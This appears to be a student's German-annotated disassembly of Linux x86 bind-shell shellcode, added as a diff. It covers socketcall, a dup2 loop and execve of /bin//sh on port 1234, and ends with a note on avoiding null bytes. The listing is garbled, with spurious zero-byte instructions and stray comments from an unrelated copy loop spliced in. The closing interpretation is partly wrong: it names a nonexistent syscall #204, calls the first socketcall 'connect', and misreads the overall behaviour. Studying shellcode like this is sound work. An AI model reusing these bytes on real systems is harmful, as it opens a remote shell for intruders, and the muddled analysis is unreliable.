@@ -1,0 +1,125 @@
+	.data:0x00000000	0000	add    BYTE PTR [eax],al	
+							 ;addiere al zu einzelenn Byte in addresse eax
+  	.data:0x00000002	0000	add    BYTE PTR [eax],al
+ 							;addiere al zu einzelenn Byte in addresse eax
+  	.data:0x00000004	31db	xor    ebx,ebx	
+ 							;ebx=0
+  	.data:0x00000006	f7e3	mul    ebx	
+ 							;multipliziere eax mit ebx (eax=0)
+  	.data:0x00000008	53	push   ebx	
+ 							;ebx auf stack pushen
+  	.data:0x00000009	43	inc    ebx		; char* src = arg[1]
+ 							;ebx+1
+	.data:0x0000000a	53	push   ebx	
+							;ebx auf stack pushen
+  	.data:0x0000000b	6a02	push   0x2	
+ 							;2 auf stack pushen0
+  	.data:0x0000000d	89e1	mov    ecx,esp		; char* dst = arg[0]
+							;ecx=esp
+  	.data:0x0000000f	b066	mov    al,0x66	
+ 							;al=102
+  	.data:0x00000011	cd80	int    0x80	
+ 							;systemcall #102 sys_socketcall (ebx=1, ecx=12)		>>>>><<<<<<<
+  	.data:0x00000013	5b	pop    ebx	
+ 							;element vom stack nehmen und in ebx speichern
+  	.data:0x00000014	0000	add    BYTE PTR [eax],al	; dst[i] = c
+ 							;addiere al zu einzelenn Byte in addresse eax
+  	.data:0x00000016	0010	add    BYTE PTR [eax],dl	
+ 							;addiere dl zu einzelenn Byte in addresse eax
+  	.data:0x00000018	5e	pop    esi		; i++
+ 							;element vom stack in esi speichern
+  	.data:0x00000019	52	push   edx	
+ 							;edx auf stack legen
+  	.data:0x0000001a	68ff0204d2	push   0xd20402ff	
+ 							;pushe 3523478271 auf stack
+  	.data:0x0000001f	6a10	push   0x10	
+ 							;pushe 16 auf stack
+  	.data:0x00000021	51	push   ecx	
+ 							;ecx pushen
+  	.data:0x00000022	50	push   eax	
+ 							;eax pushen
+  	.data:0x00000023	89e1	mov    ecx,esp	
+ 							;ecx=esp
+  	.data:0x00000025	6a66	push   0x66	
+ 							;102 pushen
+  	.data:0x00000027	58	pop    eax	
+ 							;element vom stack in eax speichern	 eax=102
+  	.data:0x00000028	0000	add    BYTE PTR [eax],al	
+							addiere al zu einzelenn Byte in addresse eax  (eax=eax+letztes byte von eax)
+  	.data:0x0000002a	0020	add    BYTE PTR [eax],ah	
+  							;addiere ah zu einzelenn Byte in addresse eax  (eax=eax+vorletztes byte von eax) eax=204
+  	.data:0x0000002c	cd80	int    0x80	
+ 							;systemcall #204	>>>>><<<<<<
+  	.data:0x0000002e	894104	mov    DWORD PTR [ecx+0x4],eax	
+ 							;bewege die 32-bit integer darstellung von eax zu 4 bytes, startend an position ecx+0x4
+  	.data:0x00000031	b304	mov    bl,0x4	
+ 							;bl=4
+  	.data:0x00000033	b066	mov    al,0x66	
+ 							;al=102
+  	.data:0x00000035	cd80	int    0x80	
+ 							;systemcall #102 sys_socketcall >>>>>><<<<<<
+ 							;(ebx=4,ecx=3264)
+  	.data:0x00000037	43	inc    ebx	
+ 							;ebx=ebx+1
+  	.data:0x00000038	b066	mov    al,0x66	
+ 							;al=102
+  	.data:0x0000003a	cd80	int    0x80	
+ 							;systemcall #102 sys_socketcall >>>>>><<<<<
+ 							;(ebx=5,ecx=3264)
+  	.data:0x0000003c	0000	add    BYTE PTR [eax],al	
+   							;addiere al zu einzelenn Byte in addresse eax
+  	.data:0x0000003e	0030	add    BYTE PTR [eax],dh	
+   							;addiere dh zu einzelenn Byte in addresse eax
+  	.data:0x00000040	93	xchg   ebx,eax	
+ 							;ebx=eax , eax=ebx
+  	.data:0x00000041	59	pop    ecx	
+ 							;element vom stack in ecx speichern
+  	.data:0x00000042			
+  	.data:0x00000042		loc_00000042:	
+┏▶	.data:0x00000042	6a3f	push   0x3f	
+ 							;63 auf stack legen
+┃ 	.data:0x00000044	58	pop    eax	
+ 							;element vom stack in eax speichern
+┃ 	.data:0x00000045	cd80	int    0x80	
+ 							;systemcall #63 sys_dup2 >>>>>><<<<<<
+┃ 	.data:0x00000047	49	dec    ecx	
+ 							;ecx=ecx-1
+┗ 	.data:0x00000048	79f8	jns    loc_00000042	
+ 							;jump wenn positiv zu loc_00000042	
+  	.data:0x0000004a	682f2f7368	push   0x68732f2f	
+ 							;pushe 1752379183
+  	.data:0x0000004f	6800000040	push   0x40000000	
+ 							;pushe 1073741824
+  	.data:0x00000054	2f	das	
+ 							;Decimal adjust AL after subtraction
+  	.data:0x00000055	62696e	bound  ebp,QWORD PTR [ecx+0x6e]	
+ 							;überprüfe größe von ebp und speicherplatz in 64 bit startend an ecx+0x6e
+  	.data:0x00000058	89e3	mov    ebx,esp	
+ 							;ebx=esp
+  	.data:0x0000005a	50	push   eax	
+ 							;eax pushen
+  	.data:0x0000005b	53	push   ebx	
+ 							;ebx pushen
+  	.data:0x0000005c	89e1	mov    ecx,esp	
+ 							;ecx=esp
+  	.data:0x0000005e	b00b	mov    al,0xb	
+ 							;al=11
+  	.data:0x00000060	cd80	int    0x80
+ 							;systemcall #11 sys_execve >>>>>>>><<<<<
+
+b)
+systemcall #102	sys_socketcall	net/socket.c			ebx=int		ecx=unsigned long *
+systemcall #63	sys_dup2	fs/fcntl.c			ebx=uns. int	ecx=unsigned int
+systemcall #11	sys_execve	arch/i386/kernel/process.c	ebx=struct pt_regs
+
+1. systemcall #102 connect function: ebx=1 ecx=12 (3*pushen=3*4=12)
+2. systemcall #204? push 102, pop eax, eax=eax+al(102), eax=eax+ah(0), eax=204
+3. systemcall #102 ebx=4,ecx=3264(durch (mov    DWORD PTR [ecx+0x4],eax) ist ecx=eax um 4 geshiftet)
+4. systemcall #102 ebx=5, ecx=3264
+5. systemcall #63  ebx=204, ecx=204, ecx=ecx-1...
+6. systemcall #11  execute programm: ebx= file to run, ebx=32(ebx=esp=stackpointer(8*4=32) )
+
+programm ruft viele neue sockets auf und mit systemcall #63 werden dann über diese neuen sockets anstatt der alten die daten gesendet. Am ende wird noch ein Programm ausgeführt
+
+;a43 c)
+;im shellcode darf kein 0-byte enthalten sein, da dieser das stringende markiert		
